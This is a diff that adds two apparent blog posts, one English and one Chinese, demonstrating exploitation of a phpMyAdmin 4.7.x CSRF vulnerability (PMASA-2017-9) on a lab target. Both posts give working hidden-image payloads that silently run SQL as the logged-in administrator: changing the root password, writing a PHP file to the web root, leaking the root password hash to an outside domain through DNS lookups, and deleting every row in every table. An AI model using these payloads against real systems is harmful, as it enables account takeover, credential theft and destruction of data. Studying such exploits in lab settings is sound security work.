@@ -76,6 +76,181 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/" class="article-date">
+  <time datetime="2018-06-12T01:00:56.000Z" itemprop="datePublished">2018-06-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/">phpMyAdmin 4.7.x XSRF/CSRF Vulnerability (PMASA-2017-9) Exploit</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Author: Ambulong</p>
+<h2 id="1-phpMyAmin-4-7-x-XSRF-CSRF-Vulnerability-PMASA-2017-9"><a href="#1-phpMyAmin-4-7-x-XSRF-CSRF-Vulnerability-PMASA-2017-9" class="headerlink" title="1 phpMyAmin 4.7.x XSRF/CSRF Vulnerability (PMASA-2017-9)"></a>1 phpMyAmin 4.7.x XSRF/CSRF Vulnerability (PMASA-2017-9)</h2><p>phpMyAdmin is a well-known MySQL/MariaDB online management tool, phpMyAdmin team released the version 4.7.7 that addresses the CSRF vulnerability found by Barot. (<a href="https://www.phpmyadmin.net/security/PMASA-2017-9/" target="_blank" rel="external">PMASA-2017-9</a>). The vulnerability allows an attacker to execute an arbitrary SQL statement silently by inducing an administrator to access malicious pages.</p>
+<p>In this article, we will use VulnSpy’s <a href="https://www.vulnspy.com/?u=pmasa-2017-9" target="_blank" rel="external">online phpMyAdmin environment</a> to demonstrate the exploit of this vulnerability.</p>
+<p><strong>VulnSpy’s online phpMyAdmin environment address: <a href="https://www.vulnspy.com/?u=pmasa-2017-9" target="_blank" rel="external">https://www.vulnspy.com/?u=pmasa-2017-9</a></strong></p>
+<h2 id="2-Exploit-CSRF-Modifying-the-password-of-current-user"><a href="#2-Exploit-CSRF-Modifying-the-password-of-current-user" class="headerlink" title="2 Exploit CSRF - Modifying the password of current user"></a>2 Exploit CSRF - Modifying the password of current user</h2><p>Change the current user password to <code>www.vulnspy.com</code>, SQL command: </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SET</span> passsword=<span class="keyword">PASSWORD</span>(<span class="string">'www.vulnspy.com'</span>);</div></pre></td></tr></table></figure>
+<h3 id="Exploit-Demonstration"><a href="#Exploit-Demonstration" class="headerlink" title="Exploit Demonstration"></a>Exploit Demonstration</h3><p><strong>2.1 Log in to phpMyAdmin</strong></p>
+<p>Username: root Password: toor</p>
+<img src="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/2.1.1.png" alt="phpMyAdmin" title="phpMyAdmin">
+<p><strong>2.2 Create a page with malicious code.</strong></p>
+<p>Filename: 2.payload.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://7f366ec1afc5832757a402b5355132d0.vsplate.me/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password</span></span></div><div class="line"><span class="tag"><span class="string">%20=%20PASSWORD(%27www.vulnspy.com%27)"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> /&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>2.3 Open the file 2.payload.html in browser</strong></p>
+<img src="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/2.3.1.png" alt="2.payload.html" title="2.payload.html">
+<p>Go back to phpMyAdmin, you’ll find that the account has been loged out automatically, and the password of root have been changed.</p>
+<img src="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/2.3.2.png" alt="2.payload.html 2" title="2.payload.html 2">
+<p><strong>2.4 Login successfully with the password <code>www.vulnspy.com</code></strong></p>
+<img src="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/2.4.1.png" alt="Password Changed" title="Password Changed">
+<h2 id="3-Exploit-CSRF-Arbitrary-File-Write"><a href="#3-Exploit-CSRF-Arbitrary-File-Write" class="headerlink" title="3 Exploit CSRF - Arbitrary File Write"></a>3 Exploit CSRF - Arbitrary File Write</h2><p>Write the code <code>&lt;?php phpinfo();?&gt;</code> to the file <code>/var/www/html/test.php</code>, SQL command: </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/test.php'</span>;</div></pre></td></tr></table></figure>
+<h3 id="Exploit-Demonstration-1"><a href="#Exploit-Demonstration-1" class="headerlink" title="Exploit Demonstration"></a>Exploit Demonstration</h3><p><strong>3.1 Payload</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://7f366ec1afc5832757a402b5355132d0.vsplate.me/sql.php?db=mysql&amp;table=user&amp;sql_query=select '&lt;?php phpinfo();?&gt;' into outfile '/var/www/html/test.php';"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> /&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>3.2 Open the file contain the payload in browser</strong></p>
+<p><strong>3.3 Visit test.php</strong></p>
+<img src="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/3.3.1.png" alt="phpinfo()" title="phpinfo()">
+<h2 id="4-Exploit-CSRF-Data-Retrieval-over-DNS"><a href="#4-Exploit-CSRF-Data-Retrieval-over-DNS" class="headerlink" title="4 Exploit CSRF - Data Retrieval over DNS"></a>4 Exploit CSRF - Data Retrieval over DNS</h2><p>Steal the password hash of root, SQL command: </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="string">'.vulnspy.com\\test'</span>));</div></pre></td></tr></table></figure>
+<p>Fetch the current database name:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">database</span>()),<span class="string">'.vulnspy.com\\test'</span>));</div></pre></td></tr></table></figure>
+<p><strong>VSPlate not supports this exploit</strong></p>
+<h2 id="5-Exploit-CSRF-Empty-All-Rows-From-All-Tables"><a href="#5-Exploit-CSRF-Empty-All-Rows-From-All-Tables" class="headerlink" title="5 Exploit CSRF - Empty All Rows From All Tables"></a>5 Exploit CSRF - Empty All Rows From All Tables</h2><p>Empty all rows from all tables, SQL command: </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> EMPT;</div><div class="line">DELIMITER $$</div><div class="line">    <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> EMPT()</div><div class="line">    <span class="keyword">BEGIN</span></div><div class="line">        <span class="keyword">DECLARE</span> i <span class="built_in">INT</span>;</div><div class="line">        <span class="keyword">SET</span> i = <span class="number">0</span>;</div><div class="line">        WHILE i &lt; 100 DO</div><div class="line">            <span class="keyword">SET</span> @del = (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'DELETE FROM '</span>,TABLE_SCHEMA,<span class="string">'.'</span>,TABLE_NAME) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'%_schema'</span> <span class="keyword">and</span> TABLE_SCHEMA!=<span class="string">'mysql'</span> <span class="keyword">LIMIT</span> i,<span class="number">1</span>);</div><div class="line">            <span class="keyword">PREPARE</span> STMT <span class="keyword">FROM</span> @del;</div><div class="line">            <span class="keyword">EXECUTE</span> STMT;</div><div class="line">            <span class="keyword">SET</span> i = i +<span class="number">1</span>;</div><div class="line">        <span class="keyword">END</span> <span class="keyword">WHILE</span>;</div><div class="line">    <span class="keyword">END</span> $$</div><div class="line">DELIMITER ;</div><div class="line"></div><div class="line"><span class="keyword">CALL</span> EMPT();</div></pre></td></tr></table></figure>
+<h3 id="Exploit-Demonstration-2"><a href="#Exploit-Demonstration-2" class="headerlink" title="Exploit Demonstration"></a>Exploit Demonstration</h3><p><strong>5.1 Payload</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://7f366ec1afc5832757a402b5355132d0.vsplate.me/import.php?db=mysql&amp;table=user&amp;sql_query=DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> /&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>5.2 Open the file contain the payload in browser</strong></p>
+<p><strong>5.3 Go back to phpMyAdmin</strong></p>
+<p>You’ll find the data in database <code>vulnspy_tables</code> and <code>vulnspy_test</code> have been deleted.</p>
+<img src="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/5.3.1.png" alt="Empty DBS" title="Empty DBS">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulnspy.com/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/" data-id="cjib28b800009hzpvwldi82bl" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/" class="article-date">
+  <time datetime="2018-06-10T15:58:49.000Z" itemprop="datePublished">2018-06-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/">phpMyAdmin 4.7.x CSRF 漏洞利用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: Ambulong</p>
+<p>phpMyAdmin是个知名MySQL/MariaDB在线管理工具，phpMyAdmin团队在4.7.7版本中修复了一个危害严重的CSRF漏洞（<a href="https://www.phpmyadmin.net/security/PMASA-2017-9/" target="_blank" rel="external">PMASA-2017-9</a>），攻击者可以通过诱导管理员访问恶意页面，悄无声息地执行任意SQL语句。</p>
+<p>该篇文章我们将结合VulnSpy的<a href="https://www.vulnspy.com/?u=pmasa-2017-9" target="_blank" rel="external">在线phpMyAdmin环境</a>来熟悉该漏洞的利用。</p>
+<p><strong>在线 phpMyAdmin CSRF 演练地址：<a href="https://www.vulnspy.com/?u=pmasa-2017-9" target="_blank" rel="external">https://www.vulnspy.com/?u=pmasa-2017-9</a></strong></p>
+<p>注：重启演示靶机即可重置靶机</p>
+<h2 id="1-在线创建-phpMyAdmin-环境"><a href="#1-在线创建-phpMyAdmin-环境" class="headerlink" title="1 在线创建 phpMyAdmin 环境"></a>1 在线创建 phpMyAdmin 环境</h2><p>点击 VulnSpy 提供的创建靶机地址（<a href="https://www.vsplate.com/?github=vulnspy/PMASA-2017-9）" target="_blank" rel="external">https://www.vsplate.com/?github=vulnspy/PMASA-2017-9）</a></p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.1.png" alt="VulnSpy" title="VulnSpy">
+<p>跳转到 VSPlate 后，直接点击<code>GO</code>按钮，便会自动创建一个 phpMyAdmin 环境</p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.2.png" alt="VSPlate GO" title="VSPlate GO">
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.3.png" alt="VSPlate Labs" title="VSPlate Labs">
+<p>打开<code>演示地址</code>的链接，我们的 phpMyAdmin 就创建完成了。</p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.4.png" alt="VSPlate Demo" title="VSPlate Demo">
+<p>使用帐号 <code>root</code> ，密码 <code>toor</code> ，登录 phpMyAdmin 。根据页面信息，我们可以发现当前 phpMyAdmin 的版本为 4.7.6，刚好匹配存在漏洞的 phpMyAdmin 版本。</p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/1.5.png" alt="VSPlate Demo 2" title="VSPlate Demo 2">
+<h2 id="2-CSRF-漏洞利用-修改当前数据库用户密码"><a href="#2-CSRF-漏洞利用-修改当前数据库用户密码" class="headerlink" title="2 CSRF 漏洞利用 - 修改当前数据库用户密码"></a>2 CSRF 漏洞利用 - 修改当前数据库用户密码</h2><p>我们知道，如果要利用CSRF来删除或修改数据库内容，通查情况下需要提前知道数据库名、表名和字段名。这样利用显得有点复杂，成功率也有限，因此本文我们将介绍几种较为通用的利用方式。</p>
+<p>在MySQL中支持使用SQL语句来修改当前用户密码。比如将当前用户密码修改为<code>www.vulnspy.com</code>，对应的SQL语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SET</span> passsword=<span class="keyword">PASSWORD</span>(<span class="string">'www.vulnspy.com'</span>);</div></pre></td></tr></table></figure>
+<h3 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h3><p><strong>2.1 模拟管理员登录phpMyAdmin的状态。</strong></p>
+<p>用帐号 root 密码 toor 登录 phpMyAdmin 。</p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/2.1.1.png" alt="phpMyAdmin" title="phpMyAdmin">
+<p><strong>2.2 创建含有恶意代码的页面。</strong></p>
+<p>文件名 2.payload.html （将下面的域名换成自己的靶机域名）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://7f366ec1afc5832757a402b5355132d0.vsplate.me/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password</span></span></div><div class="line"><span class="tag"><span class="string">%20=%20PASSWORD(%27www.vulnspy.com%27)"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> /&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>2.3 用浏览器打开含有恶意代码的文件 2.payload.html</strong></p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/2.3.1.png" alt="2.payload.html" title="2.payload.html">
+<p>回到上一步打开的phpMyAdmin页面，发现已自动退出，而且用原来的密码 toor 已经无法登录。</p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/2.3.2.png" alt="2.payload.html 2" title="2.payload.html 2">
+<p><strong>2.4 使用密码 www.vulnspy.com 登录成功，表明利用成功</strong></p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/2.4.1.png" alt="Password Changed" title="Password Changed">
+<h2 id="3-CSRF-漏洞利用-写文件"><a href="#3-CSRF-漏洞利用-写文件" class="headerlink" title="3 CSRF 漏洞利用 - 写文件"></a>3 CSRF 漏洞利用 - 写文件</h2><p>MySQL支持将查询结果写到文件当中，我们可以利用该特性来写入PHP文件。比如将代码<code>&lt;?php phpinfo();?&gt;</code>写到文件<code>/var/www/html/test.php</code>中，对应的SQL语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/test.php'</span>;</div></pre></td></tr></table></figure>
+<h3 id="利用演示-1"><a href="#利用演示-1" class="headerlink" title="利用演示"></a>利用演示</h3><p><strong>3.1 将上一个演示步骤相同，只需将2.2中的文件代码改成：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://7f366ec1afc5832757a402b5355132d0.vsplate.me/sql.php?db=mysql&amp;table=user&amp;sql_query=select '&lt;?php phpinfo();?&gt;' into outfile '/var/www/html/test.php';"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> /&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>3.2 用浏览器打开含有恶意代码的文件</strong></p>
+<p><strong>3.3 访问 test.php</strong></p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/3.3.1.png" alt="phpinfo()" title="phpinfo()">
+<p>可见文件已经写入成功。</p>
+<h2 id="4-CSRF-漏洞利用-获取数据"><a href="#4-CSRF-漏洞利用-获取数据" class="headerlink" title="4 CSRF 漏洞利用 - 获取数据"></a>4 CSRF 漏洞利用 - 获取数据</h2><p>MySQL提供了<code>load_file()</code>函数来支持读取文件内容的操作。比如读取文件<code>/etc/passwd</code>内容，，对应的SQL语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>);</div></pre></td></tr></table></figure>
+<p>但是对于CSRF漏洞来说，该读取操作实在目标用户端执行的，我们依然无法知道文件读取的结果。而<code>load_file()</code>在Windows下支持从网络共享文件夹中读取文件，如<code>\\192.168.1.100\share\vulnspy.txt</code>。网络共享文件的地址处不仅可以填写IP还可以填写域名，我们可以通过DNS解析来获取查询的数据。</p>
+<p><em>此处需要用到 DNSLOG 之类的工具：<a href="https://github.com/BugScanTeam/DNSLog，" target="_blank" rel="external">https://github.com/BugScanTeam/DNSLog，</a> 这类工具可以记录域名的 DNS 解析记录</em></p>
+<p>比如通过DNS解析来获取当前 MySQL root 用户密码，对应的SQL语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="string">'.vulnspy.com\\test'</span>));</div></pre></td></tr></table></figure>
+<p>获取当前数据库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">database</span>()),<span class="string">'.vulnspy.com\\test'</span>));</div></pre></td></tr></table></figure>
+<p>如果请求成功，查询结果将作为二级域名的一部分出现在我们的 DNS 解析记录当中。</p>
+<p><strong>该环境暂无法演示</strong></p>
+<h2 id="5-CSRF-漏洞利用-清空所有数据表"><a href="#5-CSRF-漏洞利用-清空所有数据表" class="headerlink" title="5 CSRF 漏洞利用 - 清空所有数据表"></a>5 CSRF 漏洞利用 - 清空所有数据表</h2><p>如果上面几种利用方式都无法直接造成直接的影响，我们可以利用SQL语句来清空当前MySQL用户可操作的所有数据表。</p>
+<p>我们用命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'DELETE FROM '</span>,TABLE_SCHEMA,<span class="string">'.'</span>,TABLE_NAME) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'%_schema'</span> <span class="keyword">and</span> TABLE_SCHEMA!=<span class="string">'mysql'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></div></pre></td></tr></table></figure>
+<p>来获取数据名和表名，并将其拼接成删除语句（如：<code>DELETE FROM vulnspy_tables.inv</code>），通过 <code>execute</code> 来执行生成的删除语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">set</span> @del = (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'DELETE FROM '</span>,TABLE_SCHEMA,<span class="string">'.'</span>,TABLE_NAME) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'%_schema'</span> <span class="keyword">and</span> TABLE_SCHEMA!=<span class="string">'mysql'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>);</div><div class="line"><span class="keyword">prepare</span> stmt <span class="keyword">from</span> @del;</div><div class="line"><span class="keyword">execute</span> stmt;</div></pre></td></tr></table></figure>
+<p>但是 execute 一次只能执行一条SQL语句，因此我们可以利用循环语句来逐一执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> EMPT;</div><div class="line">DELIMITER $$</div><div class="line">    <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> EMPT()</div><div class="line">    <span class="keyword">BEGIN</span></div><div class="line">        <span class="keyword">DECLARE</span> i <span class="built_in">INT</span>;</div><div class="line">        <span class="keyword">SET</span> i = <span class="number">0</span>;</div><div class="line">        WHILE i &lt; 100 DO</div><div class="line">            <span class="keyword">SET</span> @del = (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'DELETE FROM '</span>,TABLE_SCHEMA,<span class="string">'.'</span>,TABLE_NAME) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'%_schema'</span> <span class="keyword">and</span> TABLE_SCHEMA!=<span class="string">'mysql'</span> <span class="keyword">LIMIT</span> i,<span class="number">1</span>);</div><div class="line">            <span class="keyword">PREPARE</span> STMT <span class="keyword">FROM</span> @del;</div><div class="line">            <span class="keyword">EXECUTE</span> STMT;</div><div class="line">            <span class="keyword">SET</span> i = i +<span class="number">1</span>;</div><div class="line">        <span class="keyword">END</span> <span class="keyword">WHILE</span>;</div><div class="line">    <span class="keyword">END</span> $$</div><div class="line">DELIMITER ;</div><div class="line"></div><div class="line"><span class="keyword">CALL</span> EMPT();</div></pre></td></tr></table></figure>
+<h3 id="利用演示-2"><a href="#利用演示-2" class="headerlink" title="利用演示"></a>利用演示</h3><p><strong>5.1 Payload如下</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://7f366ec1afc5832757a402b5355132d0.vsplate.me/import.php?db=mysql&amp;table=user&amp;sql_query=DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> /&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>5.2 用浏览器打开含有恶意代码的文件</strong></p>
+<p><strong>5.3 回到 phpMyAdmin 中查看数据</strong></p>
+<p>可以发现数据库<code>vulnspy_tables</code>和数据库<code>vulnspy_test</code>中的数据已经被清空。</p>
+<img src="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/5.3.1.png" alt="Empty DBS" title="Empty DBS">
+<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h2><p>这个 phpMyAdmin 的 CSRF 漏洞利用有点类似 SQL 盲注的利用，但是对于漏洞触发的时间不可控（即不知道管理员何时会访问含有恶意代码的页面），因此需要更加通用的利用方式。通过该实验，不仅了解该漏洞的内容，还可以更加熟悉CSRF漏洞的利用。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulnspy.com/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/" data-id="cjib28b84000chzpvovey6bjv" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Wordpress-4-8-2-SQL-Injection-POC" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" class="article-date">
@@ -137,7 +312,7 @@
       
     </div>
     <footer class="article-footer">
